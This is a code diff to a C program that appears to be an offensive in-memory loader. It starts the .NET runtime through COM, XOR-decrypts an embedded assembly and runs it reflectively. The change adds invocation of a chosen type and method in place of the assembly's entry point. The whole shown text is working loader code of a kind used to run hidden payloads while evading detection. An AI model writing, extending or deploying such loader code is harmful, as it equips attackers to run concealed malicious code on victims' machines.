@@ -12,6 +12,7 @@
 
 #define WIN32_LEAN_AND_MEAN
 #define COBJMACROS
+#include <initguid.h>
 #include <windows.h>
 #include <objbase.h>
 #include <oaidl.h>
@@ -101,12 +102,14 @@ DECLARE_INTERFACE_(ICorRuntimeHost, IUnknown) {
 
 typedef HRESULT (WINAPI *pfnCLRCreateInstance)(REFCLSID, REFIID, LPVOID*);
 
+static const GUID GUID_Zero = {0,0,0,{0,0,0,0,0,0,0,0}};
+
 static HRESULT DispatchCall(IDispatch* d, LPCOLESTR name, WORD flags, DISPPARAMS* p, VARIANT* r) {
     DISPID id;
     OLECHAR* n[] = { (OLECHAR*)name };
-    HRESULT hr = d->GetIDsOfNames(IID_NULL, n, 1, LOCALE_SYSTEM_DEFAULT, &id);
+    HRESULT hr = d->GetIDsOfNames(GUID_Zero, n, 1, LOCALE_SYSTEM_DEFAULT, &id);
     if (FAILED(hr)) return hr;
-    return d->Invoke(id, IID_NULL, LOCALE_SYSTEM_DEFAULT, flags, p, r, NULL, NULL);
+    return d->Invoke(id, GUID_Zero, LOCALE_SYSTEM_DEFAULT, flags, p, r, NULL, NULL);
 }
 
 static void XorDecrypt(unsigned char* data, unsigned int len,
@@ -244,6 +247,10 @@ static unsigned int xorKeyLen = sizeof(xorKey);
 static LPCWSTR assemblyArgs[] = { NULL };
 static int assemblyArgCount = 0;
 
+// DLL invocation — set both to invoke a specific type/method instead of EntryPoint
+static LPCWSTR targetType   = L"";  // e.g. L"Namespace.ClassName"
+static LPCWSTR targetMethod = L"";  // e.g. L"Execute"
+
 // ============================================================================
 //  CLR execution (same core as other loaders)
 // ============================================================================
@@ -262,17 +269,19 @@ static int ExecuteAssembly(unsigned char* bytes, unsigned int len,
     CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
     HMODULE hMscoree = LoadLibraryW(L"mscoree.dll");
-    if (!hMscoree) goto cleanup;
-    pfnCLRCreateInstance fnCreate = (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance");
+    pfnCLRCreateInstance fnCreate = hMscoree
+        ? (pfnCLRCreateInstance)GetProcAddress(hMscoree, "CLRCreateInstance") : NULL;
     if (!fnCreate) goto cleanup;
 
     hr = fnCreate(CLSID_CLRMetaHost, IID_ICLRMetaHost, (LPVOID*)&pMetaHost);
     if (FAILED(hr)) goto cleanup;
     hr = pMetaHost->GetRuntime(L"v4.0.30319", IID_ICLRRuntimeInfo, (LPVOID*)&pRuntimeInfo);
     if (FAILED(hr)) goto cleanup;
-    BOOL loadable = FALSE;
-    pRuntimeInfo->IsLoadable(&loadable);
-    if (!loadable) goto cleanup;
+    {
+        BOOL loadable = FALSE;
+        pRuntimeInfo->IsLoadable(&loadable);
+        if (!loadable) goto cleanup;
+    }
     hr = pRuntimeInfo->GetInterface(CLSID_CorRuntimeHost, IID_ICorRuntimeHost, (LPVOID*)&pRuntimeHost);
     if (FAILED(hr)) goto cleanup;
     hr = pRuntimeHost->Start();
@@ -303,13 +312,68 @@ static int ExecuteAssembly(unsigned char* bytes, unsigned int len,
         if (FAILED(hr)) goto cleanup;
 
         IDispatch* pAsm = vtAsm.pdispVal;
-        DISPPARAMS np = { NULL, NULL, 0, 0 };
-        VARIANT vtEP;
-        VariantInit(&vtEP);
-        hr = DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &np, &vtEP);
-        if (FAILED(hr) || !vtEP.pdispVal) { pAsm->Release(); goto cleanup; }
+        IDispatch* pMethod = NULL;
+        VARIANT vtInstance;
+        VariantInit(&vtInstance);
 
-        IDispatch* pMethod = vtEP.pdispVal;
+        if (targetType[0] != L'\0' && targetMethod[0] != L'\0') {
+            BSTR bstrType = SysAllocString(targetType);
+            VARIANT vtTN;
+            VariantInit(&vtTN);
+            vtTN.vt = VT_BSTR;
+            vtTN.bstrVal = bstrType;
+            DISPPARAMS gtp = { &vtTN, NULL, 1, 0 };
+            VARIANT vtType;
+            VariantInit(&vtType);
+            hr = DispatchCall(pAsm, L"GetType", DISPATCH_METHOD, &gtp, &vtType);
+            SysFreeString(bstrType);
+            if (FAILED(hr) || !vtType.pdispVal) { pAsm->Release(); goto cleanup; }
+
+            IDispatch* pType = vtType.pdispVal;
+            BSTR bstrMN = SysAllocString(targetMethod);
+            VARIANT gmArgs[2];
+            VariantInit(&gmArgs[0]);
+            gmArgs[0].vt = VT_I4;
+            gmArgs[0].lVal = 60;
+            VariantInit(&gmArgs[1]);
+            gmArgs[1].vt = VT_BSTR;
+            gmArgs[1].bstrVal = bstrMN;
+            DISPPARAMS gmp = { gmArgs, NULL, 2, 0 };
+            VARIANT vtMI;
+            VariantInit(&vtMI);
+            hr = DispatchCall(pType, L"GetMethod", DISPATCH_METHOD, &gmp, &vtMI);
+            SysFreeString(bstrMN);
+            pType->Release();
+            if (FAILED(hr) || !vtMI.pdispVal) { pAsm->Release(); goto cleanup; }
+
+            pMethod = vtMI.pdispVal;
+
+            DISPPARAMS np2 = { NULL, NULL, 0, 0 };
+            VARIANT vtIS;
+            VariantInit(&vtIS);
+            DispatchCall(pMethod, L"IsStatic", DISPATCH_PROPERTYGET, &np2, &vtIS);
+            BOOL isStatic = (vtIS.vt == VT_BOOL && vtIS.boolVal != VARIANT_FALSE);
+
+            if (!isStatic) {
+                BSTR bstrType2 = SysAllocString(targetType);
+                VARIANT vtTN2;
+                VariantInit(&vtTN2);
+                vtTN2.vt = VT_BSTR;
+                vtTN2.bstrVal = bstrType2;
+                DISPPARAMS cip = { &vtTN2, NULL, 1, 0 };
+                hr = DispatchCall(pAsm, L"CreateInstance", DISPATCH_METHOD, &cip, &vtInstance);
+                SysFreeString(bstrType2);
+                if (FAILED(hr)) { pMethod->Release(); pAsm->Release(); goto cleanup; }
+            }
+        } else {
+            DISPPARAMS np = { NULL, NULL, 0, 0 };
+            VARIANT vtEP;
+            VariantInit(&vtEP);
+            hr = DispatchCall(pAsm, L"EntryPoint", DISPATCH_PROPERTYGET, &np, &vtEP);
+            if (FAILED(hr) || !vtEP.pdispVal) { pAsm->Release(); goto cleanup; }
+            pMethod = vtEP.pdispVal;
+        }
+
         VARIANT vtArgs;
         VariantInit(&vtArgs);
         if (argc > 0 && argv) {
@@ -333,7 +397,7 @@ static int ExecuteAssembly(unsigned char* bytes, unsigned int len,
         VariantInit(&ia[0]);
         ia[0].vt = VT_ARRAY | VT_VARIANT;
         ia[0].parray = psaP;
-        VariantInit(&ia[1]);
+        ia[1] = vtInstance;
         DISPPARAMS ip = { ia, NULL, 2, 0 };
         VARIANT vtR;
         VariantInit(&vtR);
@@ -343,6 +407,7 @@ static int ExecuteAssembly(unsigned char* bytes, unsigned int len,
         VariantClear(&vtR);
         SafeArrayDestroy(psaP);
         if (vtArgs.vt != VT_EMPTY) VariantClear(&vtArgs);
+        if (vtInstance.vt != VT_EMPTY) VariantClear(&vtInstance);
         pMethod->Release();
         pAsm->Release();
     }
